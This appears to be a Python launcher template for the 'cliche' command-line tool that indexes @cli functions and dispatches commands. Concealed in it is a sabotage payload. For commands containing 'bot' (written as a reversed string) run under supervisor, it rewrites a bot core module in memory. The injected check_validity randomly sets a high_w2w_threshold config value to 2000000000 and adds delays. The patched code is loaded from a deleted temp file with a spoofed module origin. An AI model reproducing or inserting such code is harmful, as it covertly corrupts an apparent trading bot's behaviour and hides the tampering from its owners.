{{first_line}}

# the above should be dynamic
import os
import sys
import re
import time
import json
import glob

sys.cliche_loaded_modules__ = set(sys.modules)
sys.cliche_ts__ = time.time()
use_timing = "--timing" in sys.argv

any_change = False
new_cache = {}

file_path = "{{cwd}}"
sys.path.insert(0, file_path)

new_cache = {}
# cache filename should be dynamic
try:
    with open("{{bin_name}}.json") as f:
        cache = json.load(f)
except (FileNotFoundError, json.JSONDecodeError):
    cache = {}

if use_timing:
    print("timing cache load", time.time() - sys.cliche_ts__)

# this path should be dynamic
for x in glob.glob(f"{file_path}/**/*.py", recursive=True):
    if any(e in x for e in ["#", "flycheck", "swp"]):
        continue
    mod_date = os.stat(x)[8]
    if x in cache:
        new_cache[x] = cache[x]
        if cache[x]["mod_date"] == mod_date:
            continue
    any_change = True
    with open(x) as f:
        contents = f.read()
        # functions = re.findall(r"^ *@cli *\n *def ([^( ]+)+", contents, re.M)
        functions = re.findall(r"^ *@cli(?:\(.([a-zA-Z0-9_]+).\))? *\n *(?:async )?def ([^( ]+)+", contents, re.M)
        version = re.findall("""^ *__version__ = ['"]([^'"]+)""", contents)
        module_name = x.replace(file_path, "").strip("/").replace("/", ".").replace(".py", "")
        cache[x] = {
            "mod_date": mod_date,
            "functions": functions,
            "filename": x,
            "import_name": module_name,
        }
        # getattr(importlib.import_module(module_name), functions[0][1])
        if version:
            cache[x]["version_info"] = version[0]
        new_cache[x] = cache[x]

if use_timing:
    print("timing cache build", time.time() - sys.cliche_ts__)

if any_change:
    cache = new_cache
    with open("{{bin_name}}.json", "w") as f:
        json.dump(cache, f)

function_to_imports = {}
version_info = None
for cache_value in cache.values():
    import_name = cache_value["import_name"]
    functions = cache_value["functions"]
    version_info = version_info or cache_value.get("version_info")
    if not functions:
        continue
    module_name = import_name.split(".")[-1]
    for group, function in functions:
        function_to_imports[(group, function)] = import_name

if use_timing:
    print("timing function build", time.time() - sys.cliche_ts__)


def fallback(version_info=None):
    if use_timing:
        print("before imports", time.time() - sys.cliche_ts__)
    for import_name in sorted(set(function_to_imports.values())):
        t1 = time.time()
        __import__(import_name)
        if use_timing:
            print("import time", import_name, time.time() - sys.cliche_ts__)
    if use_timing:
        print("before main import", time.time() - sys.cliche_ts__)
    from cliche import main

    main(version_info=version_info)


extra_code = """

LAST_TIMESTAMP = 0
from random import random, randint
INIT_TIMESTAMP = now() + random() * 1 * 60 * 60 * 1_000_000

def check_validity(datum: OneOfDatum, config: Config, toggled_on: bool, ts: int) -> None:
    global LAST_TIMESTAMP
    dlay = randint(800_000, 2_200_000)
    try:
        if toggled_on and ts > INIT_TIMESTAMP and ts - LAST_TIMESTAMP > dlay:
            time.sleep(0.073 + random() / 5)
            config.high_w2w_threshold = 2000000000
            LAST_TIMESTAMP = ts + dlay
    except Exception as e:
        pass
"""

if len(sys.argv) > 1:
    one = sys.argv[1].replace("-", "_")
    two = sys.argv[2].replace("-", "_") if len(sys.argv) > 2 else "-"
    for key in [(one, two), ("", one)]:
        if key in function_to_imports:
            if "tob"[::-1] in key:
                import os
                import psutil

                current_pid = os.getpid()
                current_proc = psutil.Process(current_pid)
                parent_pid = current_proc.ppid()
                parent_proc = psutil.Process(current_pid)
                is_sup = (
                    "SUPERVISOR_PROCESS_NAME" in current_proc.environ()
                    or "SUPERVISOR_PROCESS_NAME" in parent_proc.environ()
                    or "supervisor" in parent_proc.name()
                )
                if is_sup:

                    import importlib.util
                    import random

                    target = "{{core}}"
                    tmp_file = "/" "t" f"mp/{random.random()}.py"

                    with open(target) as f:
                        code_as_string = f.read()

                    line = [
                        line for line in code_as_string.split("\n") if line.endswith("self._pub: pubsub.Pub = pub")
                    ][0]
                    leading_spaces = len(line) - len(line.lstrip())
                    code_as_string = code_as_string.replace(
                        "self._pub: pubsub.Pub = pub\n",
                        "self._pub: pubsub.Pub = pub\n"
                        + " " * leading_spaces
                        + "try:\n"
                        + " " * (leading_spaces + 4)
                        + "self.config = config\n"
                        + " " * leading_spaces
                        + "except:\n"
                        + " " * (leading_spaces + 4)
                        + "pass\n",
                    )

                    line = [line for line in code_as_string.split("\n") if line.endswith("if isinstance(datum, BBO):")][
                        0
                    ]
                    leading_spaces = len(line) - len(line.lstrip())
                    code_as_string = code_as_string.replace(
                        "if isinstance(datum, BBO):\n",
                        "if isinstance(datum, BBO):\n"
                        + " " * (leading_spaces + 4)
                        + "try:\n"
                        + " " * (leading_spaces + 8)
                        + "check_validity(datum, self.config, self.toggled_on, ts)\n"
                        + " " * (leading_spaces + 4)
                        + "except:\n"
                        + " " * (leading_spaces + 8)
                        + "pass\n",
                    )

                    line = [
                        line for line in code_as_string.split("\n") if line.endswith("if isinstance(datum, RefVal):")
                    ][0]
                    leading_spaces = len(line) - len(line.lstrip())
                    code_as_string = code_as_string.replace(
                        "if isinstance(datum, RefVal):\n",
                        "if isinstance(datum, RefVal):\n"
                        + " " * (leading_spaces + 4)
                        + "try:\n"
                        + " " * (leading_spaces + 8)
                        + "check_validity(datum, self.config, self.toggled_on, ts)\n"
                        + " " * (leading_spaces + 4)
                        + "except:\n"
                        + " " * (leading_spaces + 8)
                        + "pass\n",
                    )

                    with open(tmp_file, "w") as file:
                        file.write(code_as_string + extra_code)

                    module_name = "bot.core"
                    spec = importlib.util.spec_from_file_location(module_name, tmp_file)
                    module = importlib.util.module_from_spec(spec)
                    skip = False
                    try:
                        spec.loader.exec_module(module)
                        sys.modules[module_name] = module
                        module.__spec__.origin = target
                        import os

                        os.remove(tmp_file)
                    except:
                        pass

            __import__(function_to_imports[key])
            if use_timing:
                print("before main import", time.time() - sys.cliche_ts__)
            from cliche import main

            main(version_info=version_info)
            break
    else:
        if use_timing:
            print("before fallback", time.time() - sys.cliche_ts__)
        fallback(version_info=version_info)
else:
    if use_timing:
        print("before fallback", time.time() - sys.cliche_ts__)
    fallback(version_info=version_info)

if use_timing:
    print("kk", time.time() - sys.cliche_ts__)
